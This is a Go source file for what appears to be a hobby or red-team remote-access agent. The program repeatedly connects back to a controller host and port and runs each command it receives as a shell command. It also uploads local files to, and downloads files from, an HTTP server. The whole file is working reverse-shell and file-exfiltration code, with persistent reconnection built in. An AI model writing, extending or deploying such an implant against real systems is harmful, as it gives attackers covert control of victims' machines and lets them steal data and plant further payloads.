package main

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Agent struct contains shared state and dependencies for the agent
type Agent struct {
	lhost      string
	lport      string
	conn       net.Conn
	reader     *bufio.Reader
	hostname   string
	osVersion  string
	arch       string
	maxRetries int
	baseDelay  time.Duration
}

func MakeAgent(lhost string, lport string) (*Agent, error) {
	// Get environment info
	arch := runtime.GOARCH
	osVersion := runtime.GOOS
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to retrieve hostname: %v", err)
	}

	return &Agent{
		lhost:      lhost,
		lport:      lport,
		arch:       arch,
		osVersion:  osVersion,
		hostname:   hostname,
		maxRetries: 1000,
		baseDelay:  2 * time.Second,
		// Calculate how long that is???
	}, nil
}

func (agent *Agent) Start() {
	retries := 0

	// Retry loop with exponential backoff
	for {
		err := agent.connect()
		if err != nil {
			if retries >= agent.maxRetries {
				fmt.Printf("Max retries reached. Exiting...\n")
				return
			}
			retries++
			backoffDuration := agent.backoff(retries)
			fmt.Printf("Failed to connect. Retrying in %v...\n", backoffDuration)
			time.Sleep(backoffDuration)
		} else {
			//=== Start REPL
			fmt.Println("Connected successfully.")
			agent.REPL()
			// Reset retries
			retries = 0
		}
	}
}

func (agent *Agent) connect() error {
	// TODO: re-write by hand tomorrows
	fmt.Printf("Connecting to %s:%s...\n", agent.lhost, agent.lport)
	var err error
	agent.conn, err = net.DialTimeout("tcp", fmt.Sprintf("%s:%s", agent.lhost, agent.lport), 10*time.Second)
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	agent.reader = bufio.NewReader(agent.conn)
	return nil
}

func (agent *Agent) backoff(retries int) time.Duration {
	// Compute re-connect interval using exponential backoff:
	// (baseDelay * 2^retries) + jitter
	jitter := time.Duration(rand.Intn(1000)) * time.Millisecond
	return agent.baseDelay*(1<<retries) + jitter
}

func (agent *Agent) REPL() {
	// Infinite REPL-style loop
	for {

		// === Read
		command, err := agent.reader.ReadString('\n')
		if err != nil {
			fmt.Println("Connection closed:", err)
			// Attempt to re-connect
			err := agent.connect()
			if err != nil {
				break
			}
		}
		command = strings.TrimSpace(command)

		// Split command into base and arguments
		cmdSlice := strings.Split(command, " ")
		cmdBase := cmdSlice[0]
		cmdArgs := cmdSlice[1:]

		// === Eval
		res, err := eval(cmdBase, cmdArgs)

		// === Exit Logic
		// TODO: is there some way to make this less of a special case?
		// maybe use a channel for all this?
		if res == "exit" {
			fmt.Println("Exiting agent...")
			break
		}

		//=== Print
		if err != nil {
			agent.conn.Write([]byte(fmt.Sprintf("Error: %v\nEND_OF_RESPONSE\n", err)))
		} else {
			if !strings.HasSuffix(res, "\n") {
				res = res + "\n"
			}
			agent.conn.Write([]byte(fmt.Sprintf("%sEND_OF_RESPONSE\n", res))) // Append the marker
		}
	}
}

func eval(cmd string, args []string) (string, error) {
	// TODO: Accomodate platform specific commands and idiosyncracies by replacing this switch statement with
	// a dynamic hashmap, ie. there can be a hashmap for windows and one for linux.
	switch cmd {

	// Debugging functionality
	case "\n", "", " ":
		return "nop", nil

	case "ping":
		return "pong", nil

	case "newline":
		return "hello1\nhello2\n hello3", nil

	case "clear":
		return "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", nil

	// Cross platform commands (minus the current RunShellCommand)
	case "cd":
		if len(args) < 1 {
			return "", fmt.Errorf("no directory specified")
		}
		return ChangeDir(args[0])

	case "exit":
		return "exit", nil

	case "upload":
		if len(args) < 2 {
			return "", fmt.Errorf("usage: upload <local_file_path> <remote_file_name>")
		}
		return UploadFile(args[0], args[1])

	case "download":
		if len(args) < 2 {
			return "", fmt.Errorf("usage: download <remote_file_name> <local_file_path>")
		}

		return DownloadFile(args[0], args[1])

	default:
		return RunShellCommand(cmd, args)
	}
}

func (agent *Agent) Stop() {
	if agent.conn != nil {
		agent.conn.Close()
	}
}

func ChangeDir(path string) (string, error) {
	// Use os.Chdir to change directories
	err := os.Chdir(path)
	if err != nil {
		return "", fmt.Errorf("failed to change directory: %v", err)
	}
	return "Directory changed successfully\n", nil
}

// UploadFile uploads a file to the HTTP file server
func UploadFile(localFilePath string, remoteFileName string) (string, error) {
	file, err := os.Open(localFilePath)
	if err != nil {
		return "", fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	// Create a POST request to upload the file
	url := fmt.Sprintf("http://%s:%s/upload", "0.0.0.0", "8080") // adjust IP/Port as needed
	req, err := http.NewRequest("POST", url, file)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}
	req.Header.Set("File-Name", remoteFileName)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("failed to upload file: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("upload failed with status: %v", resp.Status)
	}

	return fmt.Sprintf("File uploaded successfully as %s", remoteFileName), nil
}

func DownloadFile(remoteFileName string, localFilePath string) (string, error) {
	url := fmt.Sprintf("http://%s:%s/download?file=%s", "0.0.0.0", "8080", remoteFileName) // adjust IP/Port as needed

	// fmt.Printf("Downloading from URL: %s\n", url)

	resp, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("failed to download file: %v", err)
	}
	defer resp.Body.Close()

	// fmt.Printf("HTTP response received. Status: %s\n", resp.Status)

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("download failed with status: %v", resp.Status)
	}

	// Create the local file
	file, err := os.Create(localFilePath)
	if err != nil {
		return "", fmt.Errorf("could not create file: %v", err)
	}
	defer file.Close()

	// fmt.Printf("Created local file: %s\n", localFilePath)

	// Copy the HTTP response body to the local file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to save file: %v", err)
	}

	// fmt.Printf("File downloaded and saved to: %s\n", localFilePath)

	return fmt.Sprintf("File downloaded successfully to %s", localFilePath), nil
}

func RunShellCommand(command string, args []string) (string, error) {
	// Create a context with a timeout (e.g., 5 seconds)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	// Execute the command with the given context (to allow for a timeout)
	cmd := exec.CommandContext(ctx, command, args...)

	// Capture the standard output and error
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Start the command
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start command: %v", err)
	}

	// Wait for the command to finish or timeout
	err := cmd.Wait()

	// If the context's deadline was exceeded (i.e., a timeout occurred)
	if ctx.Err() == context.DeadlineExceeded {
		return "", fmt.Errorf("command timed out")
	}

	// If there was an error, return the error message and stderr
	if err != nil {
		return fmt.Sprintf("Command error: %v\nStderr: %s", err, stderr.String()), err
	}

	// Return the output, or a default success message if thereâ€™s no output
	if stdout.Len() == 0 && stderr.Len() == 0 {
		return "Command executed successfully (no output)\n", nil
	}

	return stdout.String(), nil
}

func main() {
	// TODO:
	// Read from standard in:
	// Agentname
	// Remote adddr
	fmt.Println("Starting agent")

	agent, err := MakeAgent("0.0.0.0", "9002")
	if err != nil {
		fmt.Println(err)
		return
	}

	agent.Start()
}
